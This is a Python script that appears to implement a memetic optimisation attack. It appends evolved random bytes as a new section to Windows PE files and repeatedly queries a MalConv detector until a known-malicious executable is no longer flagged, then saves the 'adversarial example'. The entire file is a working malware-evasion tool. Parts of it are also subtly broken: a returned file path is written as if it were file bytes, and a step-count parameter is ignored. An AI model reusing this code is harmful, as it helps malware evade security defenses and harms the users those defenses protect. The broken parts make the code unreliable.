import os
import re
import pefile
import sys
import subprocess
import random
import shutil
import numpy as np
import tempfile
import string

ENVIRONMENT_1 = "memetic-cave"
ENVIRONMENT_2 = "memetic-cave-v3"
LOAD_PYENV = (
    'export PYENV_ROOT="$HOME/.pyenv"; '
    'export PATH="$PYENV_ROOT/bin:$PATH"; '
    'eval "$(pyenv init --path)"; '
    'eval "$(pyenv init -)"; '
    'eval "$(pyenv virtualenv-init -)"'
)

best_individual = None
best_pred = 1.0
undetected = False

def run_cmd(cmd):
    p = subprocess.run(
        ["bash", "-c", cmd],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True
    )
    # if VERBOSE:
    #     if p.stdout:
    #         print(p.stdout, end="")
    #     if p.stderr:
    #         print(p.stderr, end="", file=sys.stderr)
    return p.stdout

def getMalConvScore(sourceDir, fileHash):
    cmd = (
        f'{LOAD_PYENV}; '
        f'pyenv activate {ENVIRONMENT_1}; '
        f'python3 predict-interface-v1.py {sourceDir} malconv {fileHash}; '
        f'pyenv deactivate'
    )

    out = run_cmd(cmd)
    m = re.search(r"malconv=([0-9.]+)", out)
    if not m:
        raise RuntimeError("MalConv score not found in output :(")
    return float(m.group(1))

def detector_predict(pe_path):
    # return float(model.predict(pe_path))
    sourceDir = os.path.dirname(pe_path)
    fileHash = os.path.splitext(os.path.basename(pe_path))[0]
    predictionScore = getMalConvScore(sourceDir, fileHash)
    if VERBOSE: print(predictionScore)

    return predictionScore

def align(value, alignment):
    return ((value + alignment - 1) // alignment) * alignment

def add_section(original_pe_path, individual, out_path=None):
    pe = pefile.PE(original_pe_path)

    file_alignment = pe.OPTIONAL_HEADER.FileAlignment
    section_alignment = pe.OPTIONAL_HEADER.SectionAlignment

    last_section = pe.sections[-1]

    new_section_name = (
        "." + "".join(random.choices(string.ascii_letters, k=6))
    ).encode().ljust(8, b"\x00")

    raw_data = individual.tobytes()
    raw_size = align(len(raw_data), file_alignment)
    virtual_size = len(raw_data)

    new_raw_offset = align(
        last_section.PointerToRawData + last_section.SizeOfRawData,
        file_alignment
    )

    new_virtual_address = align(
        last_section.VirtualAddress + last_section.Misc_VirtualSize,
        section_alignment
    )

    section_header_offset = (
        pe.DOS_HEADER.e_lfanew
        + 4
        + pe.FILE_HEADER.sizeof()
        + pe.FILE_HEADER.SizeOfOptionalHeader
        + pe.FILE_HEADER.NumberOfSections * 40
    )

    pe.__structures__.append(
        pefile.SectionStructure(pe.__IMAGE_SECTION_HEADER_format__)
    )

    new_section = pe.__structures__[-1]
    new_section.set_file_offset(section_header_offset)

    new_section.Name = new_section_name
    new_section.Misc = virtual_size
    new_section.Misc_VirtualSize = virtual_size
    new_section.VirtualAddress = new_virtual_address
    new_section.SizeOfRawData = raw_size
    new_section.PointerToRawData = new_raw_offset
    new_section.PointerToRelocations = 0
    new_section.PointerToLinenumbers = 0
    new_section.NumberOfRelocations = 0
    new_section.NumberOfLinenumbers = 0
    new_section.Characteristics = 0x40000040  # READ | INITIALIZED_DATA

    pe.FILE_HEADER.NumberOfSections += 1
    pe.OPTIONAL_HEADER.SizeOfImage = align(
        new_virtual_address + virtual_size, section_alignment
    )

    if out_path is None:
        base, ext = os.path.splitext(original_pe_path)
        out_path = base + "_ae.exe"

    pe.write(out_path)

    with open(out_path, "r+b") as f:
        f.seek(new_raw_offset)
        f.write(raw_data)
        f.write(b"\x00" * (raw_size - len(raw_data)))

    pe.close()
    return out_path


def evaluate_fitness(original_pe, individual):
    global best_individual, best_pred, undetected

    ae_path = add_section(original_pe, individual)
    pred = detector_predict(ae_path)

    if pred <= best_pred:
        best_pred = pred
        best_individual = individual.copy()

    if best_pred < 0.5:
        undetected = True

    return 1.0 - pred

def hill_climb(original_pe, individual, steps=50):
    current = individual.copy()
    current_fitness = evaluate_fitness(original_pe, current)

    idxs = np.random.choice(len(current), size=50, replace=False)

    for idx in idxs:
        neighbor = current.copy()
        neighbor[idx] ^= 1

        fitness = evaluate_fitness(original_pe, neighbor)
        if fitness > current_fitness:
            current = neighbor
            current_fitness = fitness

    return current

def tournament(population, fitnesses, k=3):
    idxs = random.sample(range(len(population)), k)
    best = max(idxs, key=lambda i: fitnesses[i])
    return population[best]

def crossover(p1, p2, prob=0.5):
    if random.random() > prob:
        return p1.copy(), p2.copy()

    point = random.randint(1, len(p1)-1)
    c1 = np.concatenate([p1[:point], p2[point:]])
    c2 = np.concatenate([p2[:point], p1[point:]])
    return c1, c2

def mutate(individual, rate=0.2):
    mask = np.random.rand(len(individual)) < rate
    individual[mask] ^= 1
    return individual

def save_adversarial_example(
    original_pe,
    best_individual,
    output_dir,
    suffix="ae"
):
    os.makedirs(output_dir, exist_ok=True)

    base = os.path.splitext(os.path.basename(original_pe))[0]
    out_path = os.path.join(output_dir, f"{base}_{suffix}.exe")

    ae_bytes = add_section(original_pe, best_individual)

    with open(out_path, "wb") as f:
        f.write(ae_bytes)

    return out_path


def generate_adversarial_example(pe_path):
    global undetected, best_individual, best_pred

    undetected = False
    best_individual = None
    best_pred = 1.0

    if VERBOSE:
        print(f"[+] Starting MA for: {pe_path}")

    pred0 = detector_predict(pe_path)

    if VERBOSE:
        print(f"[+] Initial prediction: {pred0:.6f}")

    if pred0 < 0.5:
        print("PE not detected as malware")
        return pe_path

    population = [
        np.random.randint(0, 2, size=2056, dtype=np.uint8)
        for _ in range(10)
    ]

    if VERBOSE:
        print("[+] Initial population generated (size=10, length=2056)")

    gen = 0

    while gen <= 25 and not undetected:
        if VERBOSE:
            print(f"\n[+] Generation {gen}")

        fitnesses = [evaluate_fitness(pe_path, ind) for ind in population]

        if VERBOSE:
            print(f"[+] Best fitness so far: {1.0 - best_pred:.6f} (pred={best_pred:.6f})")

        new_pop = []

        while len(new_pop) < 10:
            p1 = tournament(population, fitnesses)
            p2 = tournament(population, fitnesses)

            if VERBOSE:
                print("[*] Parents selected via tournament")

            c1, c2 = crossover(p1, p2)

            if VERBOSE:
                print("[*] Crossover applied")

            c1 = mutate(c1)
            c2 = mutate(c2)

            if VERBOSE:
                print("[*] Mutation applied")

            c1 = hill_climb(pe_path, c1)
            c2 = hill_climb(pe_path, c2)

            if VERBOSE:
                print("[*] Hill climbing completed")

            new_pop.extend([c1, c2])

        population = new_pop[:10]
        gen += 1

    output_dir = os.path.dirname(pe_path)
    os.makedirs(output_dir, exist_ok=True)

    base = os.path.splitext(os.path.basename(pe_path))[0]
    out_path = os.path.join(output_dir, f"{base}_AE.exe")

    if VERBOSE:
        print(f"[+] Writing adversarial example to: {out_path}")
        print(f"[+] Best prediction achieved: {best_pred:.6f}")

    ae_bytes = add_section(pe_path, best_individual)

    with open(out_path, "wb") as f:
        f.write(ae_bytes)

    if undetected:
        print("PE Not Detected as malware!")
    else:
        print("Max generations reached, saving best individual")

    return out_path


if len(sys.argv) <= 2:
    print("python3 memetic-optimization-v1.py <sourceDir> <fileHash> [--verbose]")
    sys.exit(1)

sourceDir = sys.argv[1]
fileHash  = sys.argv[2]
VERBOSE   = "--verbose" in sys.argv

generate_adversarial_example(sourceDir + "/" + fileHash + ".exe")